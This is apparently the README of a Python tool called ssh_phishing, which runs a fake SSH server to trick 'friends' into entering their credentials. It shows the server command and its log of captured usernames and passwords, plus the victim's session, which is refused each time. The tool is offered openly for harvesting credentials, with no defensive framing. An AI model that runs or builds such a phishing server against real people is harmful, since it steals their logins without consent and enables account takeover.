# ssh_phishing

A python script that creates a dummy ssh server to make friends connect and submit their credentials (:

### The server
```
$ python ssh_phishing.py /etc/ssh/ssh_host_rsa_key
Waiting for connections...
Connection from: 127.0.0.1
Waiting for authentication...
Username: m.user
Password: my_pass
------------------------------
Username: m.user
Password: 123456
------------------------------
Username: m.user
Password: 123456
```

### The victim
```
$ ssh m.user@localhost -p 2222
m.user@localhost's password: 
Permission denied, please try again.
m.user@localhost's password: 
Permission denied, please try again.
m.user@localhost's password: 
m.user@localhost: Permission denied (password).
$
```
